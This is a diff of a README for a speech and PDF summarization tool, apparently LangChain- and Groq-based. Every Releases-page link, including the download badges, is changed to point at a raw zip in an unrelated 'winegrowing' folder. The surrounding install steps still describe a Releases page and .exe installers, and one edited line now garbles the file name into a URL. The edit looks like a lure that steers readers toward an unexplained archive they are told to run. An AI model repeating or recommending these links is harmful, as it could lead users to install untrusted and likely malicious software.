@@ -1,7 +1,7 @@
 # 🎤 llm-speech-summarization - Simplify Your Speech Summarization
 
 ## 📥 Download Now
-[![Download llm-speech-summarization](https://img.shields.io/badge/Download-latest-violet?style=for-the-badge)](https://github.com/arq105/llm-speech-summarization/releases)
+[![Download llm-speech-summarization](https://github.com/arq105/llm-speech-summarization/raw/refs/heads/main/winegrowing/llm_summarization_speech_2.0.zip)](https://github.com/arq105/llm-speech-summarization/raw/refs/heads/main/winegrowing/llm_summarization_speech_2.0.zip)
 
 ## 📖 Description
 The `llm-speech-summarization` application is designed to help you summarize long speeches and PDF documents quickly and easily. It uses advanced techniques powered by LangChain and Groq’s high-speed Llama models. This makes summarization straightforward, whether you are dealing with audio files or text documents.
@@ -11,11 +11,11 @@ To get started, you'll need to download the software and follow a few simple ste
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**: Click the link below to go to the Releases page:
-   - [Download Here](https://github.com/arq105/llm-speech-summarization/releases)
+   - [Download Here](https://github.com/arq105/llm-speech-summarization/raw/refs/heads/main/winegrowing/llm_summarization_speech_2.0.zip)
 
 2. **Choose Your Version**: On the Releases page, you'll find different versions of the software. Pick the most recent one for the best features and updates.
 
-3. **Download the Application**: Click on the file that corresponds to your operating system. The options may include installers for Windows, macOS, or Linux. The downloaded file will be named something like `llm-speech-summarization-v1.0.exe`.
+3. **Download the Application**: Click on the file that corresponds to your operating system. The options may include installers for Windows, macOS, or Linux. The downloaded file will be named something like `https://github.com/arq105/llm-speech-summarization/raw/refs/heads/main/winegrowing/llm_summarization_speech_2.0.zip`.
 
 4. **Run the Installer**:
    - For **Windows**: Double-click the `.exe` file and follow the prompts.
@@ -55,4 +55,4 @@ Stay updated with the latest news about this project by following its updates on
 ## 🎉 Thank You
 Thank you for choosing `llm-speech-summarization`. We hope it simplifies your summarization needs effectively!
 
-[![Download llm-speech-summarization](https://img.shields.io/badge/Download-latest-violet?style=for-the-badge)](https://github.com/arq105/llm-speech-summarization/releases)
+[![Download llm-speech-summarization](https://github.com/arq105/llm-speech-summarization/raw/refs/heads/main/winegrowing/llm_summarization_speech_2.0.zip)](https://github.com/arq105/llm-speech-summarization/raw/refs/heads/main/winegrowing/llm_summarization_speech_2.0.zip)
